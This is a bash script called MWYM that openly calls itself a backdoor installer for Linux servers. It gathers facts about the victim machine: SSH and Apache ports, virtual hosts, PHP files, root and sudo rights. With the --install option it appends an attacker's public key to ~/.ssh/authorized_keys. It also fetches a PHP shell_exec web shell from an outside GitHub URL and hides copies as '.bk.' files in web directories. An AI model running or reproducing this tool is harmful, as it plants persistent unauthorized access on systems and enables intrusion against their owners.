#!/bin/bash

echo "###############################"
echo "#!!# █▀▄▀█ █░█░█ █▄█ █▀▄▀█ #!!#"
echo "#!!# █░▀░█ ▀▄▀▄▀ ░█░ █░▀░█ #!!#"
echo "###############################"
echo -e "[INFO] Welcom to MWYM !!!"

## ATTACKER INFO
rsapub="<PUT YOURR id_rsa.pub HERE>"
stealth=2
php_shell_exec="$(wget -qO- https://raw.githubusercontent.com/Retr0Kr0dy/MWYM/main/Collection/Dashboard_GARNET.html)"


## SCRIPT INFO
script_name="MWYM"
script_version="0.0.1"


## ARGS
OPT_ARCH=0
OPT_DEBUG=0
OPT_INSTALL=0

bad_arg="[ERROR] Bad usage !!!\n> \t./MWYM.sh <option>\n>\n> option:\n> \t--arch\t\t: Show architecture.\n> \t--debug\t\t: Show debug.\n> \t--install\t: Install backdoors."

if [ $# == 0 ]
then
	echo -e "$bad_arg"
	exit 1
fi

while test $# -gt 0
do
    case "$1" in
        --arch) OPT_ARCH=1
            ;;
        --debug) OPT_DEBUG=1
            ;;
        --install) OPT_INSTALL=1
            ;;
        --*) echo -e "$bad_arg"; exit 1
            ;;
        *) echo -e "$bad_arg"; exit 1
            ;;
    esac
    shift
done



## VICTIM INFO
os=$(uname -o)
kern_name=$(uname -v)
kern_ver=$(uname -r)
arch=$(uname -m)
Sssh=0
Sapache2=0
Sphp=0

# check sshd
typeset -A Sssh_port
typeset -i index=0

while read l
do
	if [ "$(systemctl status sshd 2>/dev/null | grep running)" != "" ]
	then
		Sssh=1
    fi
	port=0
    while read p
	do
		[ "$p" = "" ] && continue
        port=1
	    Sssh_port[$p]="inactif"
    done <<< $(sed -e "s/^[ ]*Port[ ]\+\([0-9]\+\)[ ]*$/\\1/p" -ed $l)
    if [ $port = 0 ]
	then
        Sssh_port[22]="inactif"
    fi
done <<< $(find / -name sshd_config 2>/dev/null)

for i in ${!Sssh_port[*]}
do
    ss -tapn sport :$i 2>/dev/null | grep -q LISTEN && Sssh_port[$i]="actif"
done



# check apache2
# |-check ports
typeset -A Sapache2_port
typeset -i index=0

while read l
do
    if [ "$(systemctl status apache2 2>/dev/null | grep running)" != "" ]
    then
		Sapache2=1
    fi
	port=0
    while read p
    do
		[ "$p" = "" ] && continue
        port=1
        Sapache2_port[$p]="inactif"
    done <<< $(sed -e "s/^\s\?[ ]*Listen[ ]\+\([0-9]\+\)[ ]*$/\\1/p" -ed $l)
    if [ $port = 0 ]
	then
	    Sapache2_port[80]="inactif"
		Sapache2_port[443]="inactif"
    fi
done <<< $(find /etc/apache2 -name *.conf 2>/dev/null)

for i in ${!Sapache2_port[*]}
do
    ss -tapn sport :$i 2>/dev/null | grep -q LISTEN && Sapache2_port[$i]="actif"
done
## |-check vhosts
typeset -A Sapache2_vhost
typeset -i index=0

while read l
do
    while read h
    do
        if ! [[ "$h" = "" ]]
        then
            if ! [ "${Sapache2_vhost[$h]}" = "actif" ]
            then
                if [ "$l" = "/etc/apache2/sites-enabled/"* ]
                then
                    Sapache2_vhost["$h"]="actif"
                else
                    Sapache2_vhost["$h"]="inactif"
                fi
            fi
        fi
    done <<< $(cat $l | grep DocumentRoot | awk '{print$2}')
done <<< $(find /etc/apache2 -name *.conf 2>/dev/null)



# check php
if [ "$(php --version 2>/dev/null)" != "" ]
then
	Sphp=1
else
	Sphp=0
fi

# |-check php files
## |-check vhosts
typeset -A Sphp_files
typeset -i index=0

for i in ${!Sapache2_vhost[*]}
do
	while read l
	do
		if [[ "$(basename $l 2>/dev/null)" != *".bk."* && "$l" != "" ]]
		then
	    	Sphp_files["$l"]="$i"
		fi
	done <<< $(find $i -name *.php 2>/dev/null)
done






# check if root
if [ $EUID -ne 0 ]
then
    isroot="0"
else
    isroot="1"
    sudo_right=$(sudo -l|grep '(')
fi



## INSTAL SERVICES
install_service_ssh(){
	if [[ $stealth -lt 1 && $isroot = 1 ]]
	then
	   apt install openssh-server -y &> /dev/null
	   Sssh=1
	   echo -e "[INFO] Openssh-server successfully installed and setted up."
	fi
}

install_service_apache2(){
    if [[ $stealth -lt 1 && $isroot = 1  ]]
    then
       apt install apache2 -y &> /dev/null
       Sapache2=1
       echo -e "[INFO] Apache2 successfully installed and setted up."
    fi
}

install_service_php(){
    if [[ $stealth -lt 1 && $isroot = 1  ]]
    then
       apt install php -y &> /dev/null
       Sphp=1
       echo -e "[INFO] Php successfully installed and setted up."
    fi
}




## DEFINE BACKDOORS
MAGMAR(){
	if [ $Sssh == 1 ]
	then
	    if [ $stealth -lt 2 ]
		then
  			mkdir -p ~/.ssh/
			if [ $OPT_DEBUG == 1 ]
            then
            	echo -e "[MAGMAR][DEBUG] DIR ~/.ssh created."
			fi
		fi
		if [ "$(((echo $rsapub >> ~/.ssh/authorized_keys && echo 0) 2>/dev/null)|| echo 1)" = "0" ]
		then
			backdoor_count=$((backdoor_count + 1))
			if [ $OPT_DEBUG == 1 ]
			then
			    echo -e "[MAGMAR][DEBUG] rsapub:\n$rsapub"
                echo -e "[MAGMAR][DEBUG] Successfully written on ~/.ssh/authorized_keys"
			fi
		    echo -e "[MAGMAR] Success !!!"
		fi
	elif [ $stealth -lt 1 ]
	then
		install_service_ssh
		MAGMAR
	fi
}


ARBOK(){
	if [ $Sphp == 1 ]
	then
		if [ $stealth -lt 3 ]
		then
			for i in ${!Sphp_files[*]}
			do
				echo "$php_shell_exec" > ${Sphp_files["$i"]}/.bk.$(basename $i)
	            if [ $OPT_DEBUG == 1 ]
	            then
	                echo -e "[ARBOK][DEBUG] shell_exec file created at {${Sphp_files["$i"]}/.bk.$(basename $i)}."
	            fi
			done
            backdoor_count=$((backdoor_count + 1))
            echo -e "[ARBOK] Success !!!"
		fi
	elif [ $stealth -lt 1 ]
	then
		install_service_apache2
		install_service_php
		ARBOK
	fi
}






if [ $OPT_ARCH == 1 ]
then
	echo -e "[ARCH] ********ARCH*IS********"
	echo -e ">\n>\tos:\t\t$os\n>\tkern_name:\t$kern_name\n>\tkern_name:\t$kern_ver\n>\tarch:\t\t$arch\n>"
fi

if [ $OPT_DEBUG == 1 ]
then
	echo -e "[DEBUG] ********Servies********"
	echo -e "[DEBUG] Service:"
	echo -e ">"
	echo -e "> SSH:\t\t$Sssh"
	echo -e ">\tport:"
	for i in ${!Sssh_port[*]}
	do
	    echo -e ">\t\t[$i]:\t\t\t${Sssh_port[$i]}"
	done
    echo -e ">"
	echo -e "> Apache2:\t$Sapache2"
    echo -e ">\tport:"
    for i in ${!Sapache2_port[*]}
    do
        echo -e ">\t\t[$i]:\t\t\t${Sapache2_port[$i]}"
    done
    echo -e ">\tvhost:"
    for i in ${!Sapache2_vhost[*]}
    do
        echo -e ">\t\t[$i]:\t${Sapache2_vhost[$i]}"
    done
    echo -e ">"
	echo -e "> PHP:\t\t$Sphp"
    echo -e ">\tfiles:"
    for i in ${!Sphp_files[*]}
    do
        echo -e ">\t\t[$i]:\t${Sphp_files[$i]}"
    done
	echo -e "[DEBUG] ******Privileges******"
	echo -e "[DEBUG] isroot: $isroot"
	echo -e "[DEBUG] sudo rights are:"
	echo -e ">\t$sudo_right"
fi

	echo -e "[INFO] Setted up successfully."


if [ $OPT_INSTALL == 1 ]
then
	echo -e "[INFO] Starting: MAGMAR"
	MAGMAR
    echo -e ">\tTask ended successfully"
    echo -e "[INFO] Starting: ARBOK"
	ARBOK
	echo -e ">\tTask ended successfully"
fi

echo -e "[INFO] Backdoor_count = $backdoor_count"
echo -e "[INFO] Exiting..."
exit
